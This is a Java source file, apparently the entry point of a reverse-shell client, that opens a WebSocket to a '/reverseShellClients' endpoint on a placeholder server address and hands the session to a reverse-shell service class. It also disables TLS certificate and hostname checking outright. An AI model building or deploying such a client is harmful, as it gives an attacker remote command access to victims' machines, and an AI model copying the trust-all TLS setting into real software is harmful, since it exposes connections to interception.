package com.mtattab.reverseshell;


import com.mtattab.reverseshell.service.impl.WebsocketReverseShellServiceImpl;
import lombok.extern.java.Log;
import lombok.extern.log4j.Log4j;
import lombok.extern.slf4j.Slf4j;
import org.eclipse.jetty.util.ssl.SslContextFactory;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.client.ClientUpgradeRequest;
import org.eclipse.jetty.websocket.client.WebSocketClient;

import java.net.URI;

import java.util.concurrent.Future;
@Log
public class Main {



    public static void main(String[] args)  {
        log.info("hello");
        // Create a custom TrustManager that trusts all certificates
        SslContextFactory.Client ssl = new SslContextFactory.Client(); // ssl config
        ssl.setEndpointIdentificationAlgorithm(null); // disable endpoint identification algorithm.
        ssl.setTrustAll(true);
        WebSocketClient client = new WebSocketClient(ssl); // give ssl config to client



        try {

            client.start();
            URI serverUri = new URI("wss://127.0.0.1:8070/reverseShellClients"); // Replace with your server URL
            WebsocketReverseShellServiceImpl socket = new WebsocketReverseShellServiceImpl();

            Future<Session> session = client.connect(socket, serverUri, new ClientUpgradeRequest());

            session.get();
            System.out.println("Connected to the WebSocket server.");

            // You can send messages using socket.getSession().getRemote().sendString("Your message");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                client.stop();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }




}

